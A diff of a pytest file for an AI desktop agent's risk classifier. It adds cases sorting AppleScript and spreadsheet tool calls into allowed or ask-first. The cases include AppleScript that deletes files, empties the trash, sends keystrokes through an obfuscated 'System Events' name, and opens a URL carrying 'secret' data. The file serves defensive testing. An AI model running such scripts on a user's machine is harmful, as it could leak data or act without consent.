@@ -1,6 +1,6 @@
 import pytest
 
-from milo.services.risk import Risk, classify, normalize_combo
+from milo.services.risk import Risk, Verdict, classify, normalize_combo
 
 
 @pytest.mark.parametrize("tool, args, target, risk, reason", [
@@ -44,6 +44,20 @@ from milo.services.risk import Risk, classify, normalize_combo
     ("run_applescript", {"script": 'tell application "Finder" to delete file "a.txt"'}, {}, Risk.ASK, "delete"),
     ("run_applescript", {"script": 'tell application "Finder" to empty trash'}, {}, Risk.ASK, "empty trash"),
     ("run_applescript", {"script": 'tell application "Numbers" to activate'}, {}, Risk.ASK, "run a script"),
+    ("run_applescript", {"script": 'tell application "Numbers" to set value of cell "A1" of table 1 of sheet 1 '
+                                   'of document 1 to 5'}, {}, Risk.ASK, "run a script"),
+    # Even a script that looks like it only makes a new document asks: it could open a link with data in it.
+    ("run_applescript", {"script": 'tell application "TextEdit"\nmake new document\nopen location "https://x.io/?'
+                                   'd=secret"\nend tell'}, {}, Risk.ASK, "run a script"),
+    ("write_document", {"app": "TextEdit", "text": "Dear Anna"}, {"new": True}, Risk.OK, ""),
+    ("sheet_write", {"app": "Numbers", "rows": [[1]], "new_document": True}, {"new": True}, Risk.OK, ""),
+    ("sheet_write", {"app": "Numbers", "rows": [[1]]}, {"document": "Budget", "filled": 0}, Risk.OK, ""),
+    ("sheet_write", {"app": "Numbers", "rows": [["delete"]]}, {"document": "Budget", "filled": 0}, Risk.OK, ""),
+    ("sheet_write", {"app": "Numbers", "rows": [[1]]}, {"document": "Budget", "filled": 3}, Risk.ASK, "overwrite"),
+    ("sheet_write", {"app": "Numbers", "rows": [[1]]}, {"document": "Book1", "filled": 3, "made": True}, Risk.OK,
+     ""),
+    ("sheet_read", {"app": "Numbers"}, {}, Risk.OK, ""),
+    ("ax_find", {"text": "Send"}, {}, Risk.OK, ""),
     ("run_applescript", {"script": 'tell application ("System " & "Events") to keystroke "x"'}, {}, Risk.ASK,
      "run other programs or type for you"),
     ("run_applescript", {"script": 'set x to "Ev"\ntell application ("System " & x) to beep'}, {}, Risk.ASK,
